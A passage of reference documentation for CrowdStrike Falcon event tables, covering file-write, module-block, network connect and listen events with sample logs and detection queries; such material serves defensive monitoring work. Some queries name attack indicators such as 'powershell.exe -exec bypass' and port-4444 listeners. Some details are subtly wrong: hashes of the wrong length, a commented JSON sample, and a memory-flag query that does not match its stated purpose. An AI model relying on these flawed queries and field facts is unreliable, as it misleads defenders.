| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows |

---

### 4. Sample Log Example

```json
{
  "FsMagic": 61267,
  "ContextBaseFileName": "presentation.pptx",
  "TargetFileName": "C:\\Users\\user\\Documents\\presentation.pptx",
  "MSOfficeSubType": 2,
  "FileCategory": 2,
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-..."
}
```

---

### 5. Example Queries

```xql
// Find all MS Pptx files written with a specific target file name
event_simpleName=MSPptxFileWritten TargetFileName="*confidential_presentation.pptx*"

// Find MS Pptx files written to a network drive (Windows only)
event_simpleName=MSPptxFileWritten IsOnNetwork=true

// Find MS Pptx files written to a removable disk
event_simpleName=MSPptxFileWritten IsOnRemovableDisk=true

// Investigate MS Pptx file writes by a specific file operator SID (Windows only)
event_simpleName=MSPptxFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find MS Pptx files based on their context base file name
event_simpleName=MSPptxFileWritten ContextBaseFileName="quarterly_report.pptx"

// Find MS Pptx files that are of OOXML subtype
event_simpleName=MSPptxFileWritten MSOfficeSubType=2

// Find MS Pptx files categorized as Office Documents
event_simpleName=MSPptxFileWritten FileCategory=2

// Find MS Pptx files on a specific file system magic (Linux only)
event_simpleName=MSPptxFileWritten FsMagic=61267
```

---
## Crowdstrike Table: MSVsdxFileWritten

### 1. Table Name

**MSVsdxFileWritten**

---

### 2. Table Usage

This table records events when a process completes writing an MS Visio Drawing (VSDX) file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| FsMagic | File system magic number. | Linux |
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| MSOfficeSubType | Values: UNKNOWN (0), OLECFB (1), OOXML (2). | All |
| FileCategory | Values: OTHER (0), ARCHIVES (1), OFFICE_DOCUMENTS (2), MULTIMEDIA_FILES (3), DESIGN_FILES (4), SOURCE_CODE (5), EXECUTABLE_FILES (6), VIRTUAL_MACHINE_FILES (7), EMAIL_FILES (8), DATA_AND_LOGS (9), ENCRYPTED (10). | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows |

---

### 4. Sample Log Example

```json
{
  "FsMagic": 61267,
  "ContextBaseFileName": "diagram.vsdx",
  "TargetFileName": "C:\\Users\\user\\Documents\\diagram.vsdx",
  "MSOfficeSubType": 2,
  "FileCategory": 2,
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-..."
}
```

---

### 5. Example Queries

```xql
// Find all MS Vsdx files written with a specific target file name
event_simpleName=MSVsdxFileWritten TargetFileName="*network_diagram.vsdx*"

// Find MS Vsdx files written to a network drive (Windows only)
event_simpleName=MSVsdxFileWritten IsOnNetwork=true

// Find MS Vsdx files written to a removable disk
event_simpleName=MSVsdxFileWritten IsOnRemovableDisk=true

// Investigate MS Vsdx file writes by a specific file operator SID (Windows only)
event_simpleName=MSVsdxFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find MS Vsdx files based on their context base file name
event_simpleName=MSVsdxFileWritten ContextBaseFileName="flowchart.vsdx"

// Find MS Vsdx files that are of OOXML subtype
event_simpleName=MSVsdxFileWritten MSOfficeSubType=2

// Find MS Vsdx files categorized as Office Documents
event_simpleName=MSVsdxFileWritten FileCategory=2

// Find MS Vsdx files on a specific file system magic (Linux only)
event_simpleName=MSVsdxFileWritten FsMagic=61267
```

---
## Crowdstrike Table: MSXlsxFileWritten

### 1. Table Name

**MSXlsxFileWritten**

---

### 2. Table Usage

This table records events when a process completes writing an MS Office Open XML Spreadsheet (XLSX) file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| FsMagic | File system magic number. | Linux |
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| MSOfficeSubType | Values: UNKNOWN (0), OLECFB (1), OOXML (2). | All |
| FileCategory | Values: OTHER (0), ARCHIVES (1), OFFICE_DOCUMENTS (2), MULTIMEDIA_FILES (3), DESIGN_FILES (4), SOURCE_CODE (5), EXECUTABLE_FILES (6), VIRTUAL_MACHINE_FILES (7), EMAIL_FILES (8), DATA_AND_LOGS (9), ENCRYPTED (10). | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows |

---

### 4. Sample Log Example

```json
{
  "FsMagic": 61267,
  "ContextBaseFileName": "spreadsheet.xlsx",
  "TargetFileName": "C:\\Users\\user\\Documents\\spreadsheet.xlsx",
  "MSOfficeSubType": 2,
  "FileCategory": 2,
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-..."
}
```

---

### 5. Example Queries

```xql
// Find all MS Xlsx files written with a specific target file name
event_simpleName=MSXlsxFileWritten TargetFileName="*financial_report.xlsx*"

// Find MS Xlsx files written to a network drive (Windows only)
event_simpleName=MSXlsxFileWritten IsOnNetwork=true

// Find MS Xlsx files written to a removable disk
event_simpleName=MSXlsxFileWritten IsOnRemovableDisk=true

// Investigate MS Xlsx file writes by a specific file operator SID (Windows only)
event_simpleName=MSXlsxFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find MS Xlsx files based on their context base file name
event_simpleName=MSXlsxFileWritten ContextBaseFileName="budget.xlsx"

// Find MS Xlsx files that are of OOXML subtype
event_simpleName=MSXlsxFileWritten MSOfficeSubType=2

// Find MS Xlsx files categorized as Office Documents
event_simpleName=MSXlsxFileWritten FileCategory=2

// Find MS Xlsx files on a specific file system magic (Linux only)
event_simpleName=MSXlsxFileWritten FsMagic=61267
```

---
## Crowdstrike Table: MachOFileWritten

### 1. Table Name
**MachOFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a MachO file. It is useful for investigations into file creation, data exfiltration, and malware drops across Linux, Windows, and macOS platforms.

---

### 3. Important Parameter Description

| Parameter           | Description                                       | Platforms Affected |
|---------------------|---------------------------------------------------|--------------------|
| TargetFileName      | The resulting file name that was downloaded.      | All                |
| ContextBaseFileName | The base name of the context file.                | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/usr/local/bin/example_macho",
  "ContextBaseFileName": "example_macho"
}
```

---

### 5. Example Queries

```xql
// Find all MachO files written with a specific target file name
event_simpleName=MachOFileWritten TargetFileName="*example_macho*"

// Find MachO files based on their context base file name
event_simpleName=MachOFileWritten ContextBaseFileName="launcher"
```

---
## Crowdstrike Table: MbrOverwriteRawDetectInfo

### 1. Table Name
**MbrOverwriteRawDetectInfo**

---

### 2. Table Usage
This table provides raw detection information related to Master Boot Record (MBR) overwrites. It is emitted on Windows platforms when an MBR overwrite is detected, providing details about the process involved and the affected volume. This information is crucial for analyzing rootkit activity and system integrity compromises.

---

### 3. Important Parameter Description

| Parameter   | Description                                                                                                                                                                                                                                  | Platforms Affected |
|-------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| ImageFileName | The full path to an executable (PE) file. For ProcessRollup2 events, this is the full path to the main executable for the created process.                                                                                                                                                                                                                                                          | Windows            |
| VolumeName  | The name of the volume affected by the MBR overwrite.                                                                                                                                                                                                                                                                                                                                                | Windows            |
| CommandLine | The command line used to create this process. May be empty in some circumstances.                                                                                                                                                                                                                                                                                                                       | Windows            |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\malicious.exe",
  "VolumeName": "\\\\.\\PhysicalDrive0",
  "CommandLine": "malicious.exe -install"
}
```

---

### 5. Example Queries

```xql
// Find all MBR overwrite detection events
event_simpleName=MbrOverwriteRawDetectInfo

// Find MBR overwrite events by a specific image file name
event_simpleName=MbrOverwriteRawDetectInfo ImageFileName="*\\malicious.exe"

// Find MBR overwrite events on a specific volume
event_simpleName=MbrOverwriteRawDetectInfo VolumeName="\\\\.\\PhysicalDrive0"

// Find MBR overwrite events with a specific command line
event_simpleName=MbrOverwriteRawDetectInfo CommandLine="* -install*"
```

---
## Crowdstrike Table: MemoryProtectionUpdated

### 1. Table Name
**MemoryProtectionUpdated**

---

### 2. Table Usage
This table triggers if a new executable memory region is mapped which is writable or mapped from a file. It is useful for detecting potential code injection or memory manipulation techniques.

---

### 3. Important Parameter Description

| Parameter             | Description                                                                                          | Platforms Affected |
|-----------------------|------------------------------------------------------------------------------------------------------|--------------------|
| MemoryProtectionFlags | Values indicating the memory protection applied to the region: PROT_NONE (0x00000000), PROT_READ (0x00000001), PROT_WRITE (0x00000002), PROT_EXEC (0x00000004). | Linux, Falcon Container |
| Length                | The length of the memory region.                                                                     | Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "MemoryProtectionFlags": 4,
  "Length": 4096
}
```

---

### 5. Example Queries

```xql
// Find all MemoryProtectionUpdated events where the memory region is executable and writable
event_simpleName=MemoryProtectionUpdated MemoryProtectionFlags=(2 OR 4)

// Find MemoryProtectionUpdated events with a specific length
event_simpleName=MemoryProtectionUpdated Length=4096
```

---
## Crowdstrike Table: ModifyServiceBinary

### 1. Table Name
**ModifyServiceBinary**

---

### 2. Table Usage
This table indicates when a Windows service's binary was changed. This event is crucial for detecting persistence mechanisms, privilege escalation, and other malicious activities that involve tampering with legitimate Windows services.

---

### 3. Important Parameter Description

| Parameter         | Description                                        | Platforms Affected |
|-------------------|----------------------------------------------------|--------------------|
| ServiceImagePath  | The path to the service's executable binary.       | Windows            |
| ServiceDisplayName| The display name of the service.                   | Windows            |
| ServiceDescription| The description of the service.                    | Windows            |

---

### 4. Sample Log Example

```json
{
  "ServiceImagePath": "C:\\Windows\\System32\\newservice.exe",
  "ServiceDisplayName": "New Malicious Service",
  "ServiceDescription": "This is a newly installed malicious service."
}
```

---

### 5. Example Queries

```xql
// Find all events where a service binary was modified
event_simpleName=ModifyServiceBinary

// Find events where a specific service's binary was modified
event_simpleName=ModifyServiceBinary ServiceDisplayName="LanmanServer"

// Find events where the service image path contains a suspicious directory
event_simpleName=ModifyServiceBinary ServiceImagePath="*\\Temp\\*"
```

---

## Crowdstrike Table: ModuleBlockedEvent

### 1. Table Name
**ModuleBlockedEvent**

---

### 2. Table Usage
This table is sent to inform the cloud that a given module (identified by hash) was blocked. [cite: 1] This event is useful for understanding when specific executable modules or libraries are prevented from loading or executing, which can indicate policy enforcement, malware prevention, or application control actions across Windows, macOS, Linux, and Falcon Container platforms.

---

### 3. Important Parameter Description

| Parameter       | Description                                                                                                                                                                                                                                                                                                              | Platforms Affected |
|-----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| TargetProcessId | The unique ID of a target process (in decimal, non-hex format). This field represents the ID of the process responsible for the activity of the event in focus. | All                |
| SHA256HashData  | The SHA256 hash of a file. In most cases, it's the hash of the file referred to by the ImageFileName field.  | All                |
| TargetFileName  | The resulting file name that was downloaded.                                                                                                                                                                                                                                                                    | All                |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": 1234,
  "SHA256HashData": "0x56f3097c4d5bf4c7cffef168ee732e1c78f2ee62bc1c1ba61c219226bef619f8",
  "TargetFileName": "C:\\Program Files\\BlockedApp\\blocked_module.dll"
}
```

---

### 5. Example Queries

```xql
// Find all blocked module events
event_simpleName=ModuleBlockedEvent

// Find blocked module events for a specific target process ID
event_simpleName=ModuleBlockedEvent TargetProcessId=5678

// Find blocked module events by a specific SHA256 hash
event_simpleName=ModuleBlockedEvent SHA256HashData="0x03312a19baa7ab137c09127c6feb58c05216a7880d3c9e6ae54a8bcda460f92a"

// Find blocked module events by a specific target file name
event_simpleName=ModuleBlockedEvent TargetFileName="*malicious_library.so"
```

---
## Crowdstrike Table: ModuleBlockedEventWithPatternId

### 1. Table Name

**ModuleBlockedEventWithPatternId**

---

### 2. Table Usage

This event adds a potential reason for blocking (as a PatternId) to module blocking information. This is useful for understanding specific detection patterns that led to a module being blocked across Windows, macOS, Linux, and Falcon Container platforms. 

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetProcessId | The unique ID of a target process (in decimal, non-hex format). This field exists in almost all events, and it represents the ID of the process that is responsible for the activity of the event in focus.  | All |
| SHA256HashData | The SHA256 hash of a file. In most cases, the hash of the file referred to by the ImageFileName field.  | All |
| TargetFileName | The resulting file name that was downloaded. | All |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": 1234,
  "SHA256HashData": "0x56f3097c4d5bf4c7cffef168ee732e1c78f2ee62bc1c1ba61c219226bef619f8",
  "TargetFileName": "/usr/local/bin/blocked_module"
}
```

---

### 5. Example Queries

```xql
// Find all ModuleBlockedEventWithPatternId events
event_simpleName=ModuleBlockedEventWithPatternId

// Find blocked module events for a specific target process ID
event_simpleName=ModuleBlockedEventWithPatternId TargetProcessId=5678

// Find blocked module events by a specific SHA256 hash
event_simpleName=ModuleBlockedEventWithPatternId SHA256HashData="0x03312a19baa7ab137c09127c6feb58c05216a7880d3c9e6ae54a8bcda460f92a"

// Find blocked module events by a specific target file name
event_simpleName=ModuleBlockedEventWithPatternId TargetFileName="*malicious_library.dll"
```

---
## Crowdstrike Table: ModuleDetectInfo

### 1. Table Name

**ModuleDetectInfo**

---

### 2. Table Usage

This table identifies a scenario that would be a blocking prevention if more rigorous settings were active. This event is useful for understanding potential threats that were detected but not blocked due to current prevention policies.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetProcessId | The unique ID of a target process (in decimal, non-hex format). This field exists in almost all events, and it represents the ID of the process that is responsible for the activity of the event in focus. For example, the TargetProcessId of a process that performed thread injection in an InjectedThread event. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| SHA256HashData | The SHA256 hash of a file. In most cases, the hash of the file referred to by the ImageFileName field. | All |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": 12345,
  "TargetFileName": "/tmp/potential_malware.dll",
  "SHA256HashData": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
}
```

---

### 5. Example Queries

```xql
// Find all module detection information events
event_simpleName=ModuleDetectInfo

// Find module detection events for a specific target process ID
event_simpleName=ModuleDetectInfo TargetProcessId=9876

// Find module detection events related to a specific file name
event_simpleName=ModuleDetectInfo TargetFileName="*suspicious_module.so"

// Find module detection events with a particular SHA256 hash
event_simpleName=ModuleDetectInfo SHA256HashData="0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
```

---
## Crowdstrike Table: ModuleLoadV3DetectInfo

### 1. Table Name

**ModuleLoadV3DetectInfo**

---

### 2. Table Usage

This table provides additional information for detections from the Module Load V3 template. It is useful for understanding the details of module loading events, including file and process information, and digital signature details, specifically on Windows platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to an executable (PE) file. For ProcessRollup2 events, this is the full path to the main executable for the created process. | Windows |
| CommandLine | The command line used to create this process. May be empty in some circumstances. | Windows |
| TargetFileName | The resulting file name that was downloaded. | Windows |
| SHA256HashData | The SHA256 hash of a file. In most cases, the hash of the file referred to by the ImageFileName field. | Windows |
| SignInfoFlags | The image had a self-signed certificate. Values indicate various signature flags such as `SIGNATURE_FLAG_SELF_SIGNED` (0x00000001), `SIGNATURE_FLAG_MS_SIGNED` (0x00000002), etc. | Windows |

---

### 4\. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\drivers\\mymodule.sys",
  "CommandLine": "load driver mymodule.sys",
  "TargetFileName": "mymodule.sys",
  "SHA256HashData": "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
  "SignInfoFlags": 2 // SIGNATURE_FLAG_MS_SIGNED
}
```

---

### 5. Example Queries

```xql
// Find all ModuleLoadV3DetectInfo events
event_simpleName=ModuleLoadV3DetectInfo

// Find ModuleLoadV3DetectInfo events for a specific image file name
event_simpleName=ModuleLoadV3DetectInfo ImageFileName="*\\temp\\malicious.dll"

// Find ModuleLoadV3DetectInfo events with a specific command line
event_simpleName=ModuleLoadV3DetectInfo CommandLine="*powershell.exe -exec bypass*"

// Find ModuleLoadV3DetectInfo events by a specific SHA256 hash
event_simpleName=ModuleLoadV3DetectInfo SHA256HashData="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

// Find ModuleLoadV3DetectInfo events where the module has a self-signed certificate
event_simpleName=ModuleLoadV3DetectInfo SignInfoFlags=1
```

---
## Crowdstrike Table: MotwWritten

### 1. Table Name

**MotwWritten**

---

### 2. Table Usage

This table records events related to the Mark-of-the-Web (MotW) being written to a file. This event is primarily relevant to Windows platforms and is crucial for tracking the origin of downloaded files, which can be vital for security investigations involving file provenance and potential malware.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| HostUrl | The host URL from a file's mark of the web. | Windows |
| ReferrerUrl | The referrer URL from a file's mark of the web. | Windows |
| TargetFileName | The resulting file name that was downloaded. | Windows |
| ZoneIdentifier | The zone identifier from a file's mark of the web. Values include: LOCAL\_MACHINE (0), INTRANET (1), TRUSTED\_SITES (2), INTERNET (3), RESTRICTED\_SITES (4). | Windows |

---

### 4. Sample Log Example

```json
{
  "HostUrl": "https://www.example.com/downloads/",
  "ReferrerUrl": "https://www.example.com/downloads/page.html",
  "TargetFileName": "C:\\Users\\user\\Downloads\\document.pdf",
  "ZoneIdentifier": 3
}
```

---

### 5. Example Queries

```xql
// Find all MotW written events
event_simpleName=MotwWritten

// Find MotW events for files downloaded from a specific host URL
event_simpleName=MotwWritten HostUrl="*malicious.com*"

// Find MotW events for files referred by a specific URL
event_simpleName=MotwWritten ReferrerUrl="*phishing.org*"

// Find MotW events for files downloaded from the internet zone
event_simpleName=MotwWritten ZoneIdentifier=3

// Find MotW events for a specific target file name
event_simpleName=MotwWritten TargetFileName="*invoice.zip"
```

---
## Crowdstrike Table: MsiFileWritten

### 1. Table Name

**MsiFileWritten**

---

### 2. Table Usage

This table records events when a process completes writing a Microsoft Installer (MSI) file. It provides details about the file, the process involved, and its location, which is useful for investigations into software installations, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "example_installer.msi",
  "TargetFileName": "C:\\Users\\user\\Downloads\\example_installer.msi",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-..."
}
```

---

### 5. Example Queries

```xql
// Find all MSI files written with a specific target file name
event_simpleName=MsiFileWritten TargetFileName="*malicious_setup.msi*"

// Find MSI files written to a network drive (Windows only)
event_simpleName=MsiFileWritten IsOnNetwork=true

// Find MSI files written to a removable disk
event_simpleName=MsiFileWritten IsOnRemovableDisk=true

// Investigate MSI file writes by a specific file operator SID (Windows only)
event_simpleName=MsiFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find MSI files based on their context base file name
event_simpleName=MsiFileWritten ContextBaseFileName="update.msi"
```

---
## Crowdstrike Table: NetShareAdd

### 1. Table Name

**NetShareAdd**

---

### 2. Table Usage

This table is generated when a network share is added or modified on a host. This event is critical for monitoring system configuration changes, detecting potential privilege escalation attempts, and identifying suspicious lateral movement activities within a network environment on Windows platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ShareData | The data associated with the network share. | Windows |
| ShareName | The name of the network share. | Windows |
| SharePath | The local path that is being shared. | Windows |
| UserName | The user name associated with the event. | Windows |
| RpcClientProcessId | The ProcessId corresponding to the RPC client of this request. | Windows |

---

### 4. Sample Log Example

```json
{
  "ShareData": "Some share data",
  "ShareName": "MySharedFolder",
  "SharePath": "C:\\Shared",
  "UserName": "Administrator",
  "RpcClientProcessId": 1234
}
```

---

### 5. Example Queries

```xql
// Find all network share additions or modifications
event_simpleName=NetShareAdd

// Find network share additions with a specific share name
event_simpleName=NetShareAdd ShareName="*SensitiveDataShare*"

// Find network share additions from a specific user
event_simpleName=NetShareAdd UserName="*baduser*"

// Find network share additions for a specific shared path
event_simpleName=NetShareAdd SharePath="*C:\\Windows\\System32*"

// Find network share additions originating from a specific RPC client process ID
event_simpleName=NetShareAdd RpcClientProcessId=5678
```

---
## Crowdstrike Table: NetworkConnectIP4

### 1. Table Name

**NetworkConnectIP4**

---

### 2. Table Usage

This event is generated when an application attempts a remote connection. It provides details about the source and destination IP addresses and ports, and the protocol used, which is useful for monitoring network activity, identifying suspicious connections, and analyzing communication patterns across various platforms including ChromeOS, macOS, Android, Windows, iOS, and Linux.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RemoteAddressIP4 | The remote IPv4 address of the connection. | All |
| RemotePort | The remote port number of the connection. | All |
| Protocol | The network protocol used for the connection. Values: IP (0), ICMP (1), TCP (6), UDP (17), IPV6 (41), ICMPV6 (58), UNKNOWN (255). | All |
| LocalAddressIP4 | The local IPv4 address of the connection. | All |
| LocalPort | The local port number of the connection. | All |

---

### 4. Sample Log Example

```json
{
  "RemoteAddressIP4": "192.168.1.100",
  "RemotePort": 443,
  "Protocol": 6,
  "LocalAddressIP4": "10.0.0.5",
  "LocalPort": 54321
}
```

---

### 5. Example Queries

```xql
// Find all network connections to a specific remote IP address
event_simpleName=NetworkConnectIP4 RemoteAddressIP4="1.2.3.4"

// Find all outbound TCP connections
event_simpleName=NetworkConnectIP4 Protocol=6 ConnectionDirection=0

// Find all network connections on a specific remote port
event_simpleName=NetworkConnectIP4 RemotePort=8080

// Find network connections originating from a specific local IP and port
event_simpleName=NetworkConnectIP4 LocalAddressIP4="10.0.0.10" LocalPort=12345

// Find all UDP connections
event_simpleName=NetworkConnectIP4 Protocol=17
```

---
## Crowdstrike Table: NetworkConnectIP6

### 1. Table Name

**NetworkConnectIP6**

---

### 2. Table Usage

This event is created whenever an application using a connection-oriented protocol attempts a remote connection (e.g., via a call to the connect() function) or a connectionless protocol first attempts to transmit a message (e.g., via a call to the sendto() function). This event is generated when an application attempts a remote connection. It provides details about the source and destination IPv6 addresses and ports, and the protocol used, which is useful for monitoring network activity, identifying suspicious connections, and analyzing communication patterns across various platforms including ChromeOS, macOS, Android, Windows, iOS, and Linux.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RemoteAddressIP6 | The remote IPv6 address of the connection. | All |
| RemotePort | The remote port number of the connection. | All |
| Protocol | The network protocol used for the connection. Values: IP (0), ICMP (1), TCP (6), UDP (17), IPV6 (41), ICMPV6 (58), UNKNOWN (255). | All |
| LocalAddressIP6 | The local IPv6 address of the connection. | All |
| LocalPort | The local port number of the connection. | All |

---

### 4. Sample Log Example

```json
{
  "RemoteAddressIP6": "fe80::1ff:fe23:4567:890a",
  "RemotePort": 80,
  "Protocol": 6,
  "LocalAddressIP6": "fe80::abcd:ef12:3456:7890",
  "LocalPort": 54321
}
```

---

### 5. Example Queries

```xql
// Find all network connections to a specific remote IPv6 address
event_simpleName=NetworkConnectIP6 RemoteAddressIP6="fe80::1ff:fe23:4567:890a"

// Find all outbound TCP connections over IPv6
event_simpleName=NetworkConnectIP6 Protocol=6 ConnectionDirection=0

// Find all network connections on a specific remote port for IPv6
event_simpleName=NetworkConnectIP6 RemotePort=443

// Find network connections originating from a specific local IPv6 and port
event_simpleName=NetworkConnectIP6 LocalAddressIP6="fe80::abcd:ef12:3456:7890" LocalPort=12345

// Find all UDP connections over IPv6
event_simpleName=NetworkConnectIP6 Protocol=17
```

---
## Crowdstrike Table: NetworkListenIP4

### 1. Table Name

**NetworkListenIP4**

---

### 2. Table Usage

This table is generated when an application establishes a socket in listening mode. This event is crucial for identifying services exposed on a host, detecting unexpected or malicious listener processes, and understanding the network attack surface across ChromeOS, macOS, Windows, Android, Linux, and Falcon Container platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| LocalAddressIP4 | The local IPv4 address the socket is listening on. | All |
| LocalPort | The local port number the socket is listening on. | All |
| Protocol | The network protocol used for the listening socket. Values: IP (0), ICMP (1), TCP (6), UDP (17), IPV6 (41), ICMPV6 (58), UNKNOWN (255). | All |

---

### 4. Sample Log Example

```json
{
  "LocalAddressIP4": "0.0.0.0",
  "LocalPort": 80,
  "Protocol": 6
}
```

---

### 5. Example Queries

```xql
// Find all IPv4 network listen events
event_simpleName=NetworkListenIP4

// Find applications listening on a specific local port
event_simpleName=NetworkListenIP4 LocalPort=4444

// Find TCP listening sockets on any local IPv4 address
event_simpleName=NetworkListenIP4 Protocol=6 LocalAddressIP4="0.0.0.0"

// Find all UDP listening sockets
event_simpleName=NetworkListenIP4 Protocol=17

// Find applications listening on a specific local IP address and port
event_simpleName=NetworkListenIP4 LocalAddressIP4="192.168.1.10" LocalPort=8080
```

---
## Crowdstrike Table: NetworkListenIP6

### 1. Table Name

**NetworkListenIP6**

---

### 2. Table Usage

This table is created whenever an application using a connection-oriented protocol establishes a socket in listening mode (e.g., via a call to the listen() function). It provides details about the local IPv6 address, port, and protocol of the listening socket, which is useful for identifying services exposed on a host and detecting unexpected or malicious listener processes across ChromeOS, macOS, Windows, Android, Linux, and Falcon Container platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| LocalAddressIP6 | The local IPv6 address the socket is listening on. | All |
| LocalPort | The local port number the socket is listening on. | All |
| Protocol | The network protocol used for the listening socket. Values: ICMP (1), TCP (6), UDP (17), IPV6 (41), ICMPV6 (58), UNKNOWN (255). | All |

---

### 4. Sample Log Example

```json
{
  "LocalAddressIP6": "::",
  "LocalPort": 8080,
  "Protocol": 6
}
```

---

### 5. Example Queries

```xql
// Find all IPv6 network listen events
event_simpleName=NetworkListenIP6

// Find applications listening on a specific local IPv6 port
event_simpleName=NetworkListenIP6 LocalPort=9000

// Find TCP listening sockets on any local IPv6 address
event_simpleName=NetworkListenIP6 Protocol=6 LocalAddressIP6="::"

// Find all UDP listening sockets over IPv6
event_simpleName=NetworkListenIP6 Protocol=17

// Find applications listening on a specific local IPv6 address and port
event_simpleName=NetworkListenIP6 LocalAddressIP6="fe80::abcd:ef12:3456:7890" LocalPort=8443
```

---
## Crowdstrike Table: NetworkReceiveAcceptIP4

### 1. Table Name

**NetworkReceiveAcceptIP4**

---

### 2. Table Usage

This table is generated when an application using a connection-oriented protocol attempts to accept a remote connection request (e.g., via a call to the accept() function) or a connectionless protocol attempts to process the first datagram received. This event is crucial for monitoring incoming network connections, identifying suspicious communication, and analyzing potential exploitation attempts across macOS, Android, Windows, Linux, and Falcon Container platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RemoteAddressIP4 | The remote IPv4 address of the connection being received or accepted. | All |
| LocalPort | The local port number on which the connection is being received or accepted. | All |
| Protocol | The network protocol used for the connection. Values: IP (0), ICMP (1), TCP (6), UDP (17), IPV6 (41), ICMPV6 (58), UNKNOWN (255). | All |
| RemotePort | The remote port number of the connection being received or accepted. | All |
| LocalAddressIP4 | The local IPv4 address on which the connection is being received or accepted. | All |

---

### 4. Sample Log Example

```json
{
  "RemoteAddressIP4": "192.168.1.10",
  "LocalPort": 80,
  "Protocol": 6,
  "RemotePort": 54321,
  "LocalAddressIP4": "10.0.0.1"
}
```

---

### 5. Example Queries

```xql
// Find all IPv4 network receive/accept events
event_simpleName=NetworkReceiveAcceptIP4

// Find applications accepting connections on a specific local port
event_simpleName=NetworkReceiveAcceptIP4 LocalPort=443 Protocol=6

// Find incoming connections from a specific remote IP address
event_simpleName=NetworkReceiveAcceptIP4 RemoteAddressIP4="172.16.0.50"

// Find all accepted UDP connections
event_simpleName=NetworkReceiveAcceptIP4 Protocol=17

// Find connections accepted on a particular local IP address and port
event_simpleName=NetworkReceiveAcceptIP4 LocalAddressIP4="10.0.0.1" LocalPort=80
```

---
## Crowdstrike Table: NetworkReceiveAcceptIP6

### 1. Table Name

**NetworkReceiveAcceptIP6**

---

### 2. Table Usage

This table is created whenever an application using a connection-oriented protocol attempts to accept a remote connection request (e.g., via a call to the accept() function) or a connectionless protocol attempts to process the first datagram received. This event is crucial for monitoring incoming network connections, identifying suspicious communication, and analyzing potential exploitation attempts across macOS, Android, Windows, Linux, and Falcon Container platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RemoteAddressIP6 | The remote IPv6 address of the connection being received or accepted. | All |
| LocalPort | The local port number on which the connection is being received or accepted. | All |
| Protocol | The network protocol used for the connection. Values: IP (0), ICMP (1), TCP (6), UDP (17), IPV6 (41), ICMPV6 (58). | All |
| RemotePort | The remote port number of the connection being received or accepted. | All |
| LocalAddressIP6 | The local IPv6 address on which the connection is being received or accepted. | All |

---

### 4. Sample Log Example

```json
{
  "RemoteAddressIP6": "fe80::1ff:fe23:4567:890a",
  "LocalPort": 80,
  "Protocol": 6,
  "RemotePort": 54321,
  "LocalAddressIP6": "fe80::abcd:ef12:3456:7890"
}
```

---

### 5. Example Queries

```xql
// Find all IPv6 network receive/accept events
event_simpleName=NetworkReceiveAcceptIP6

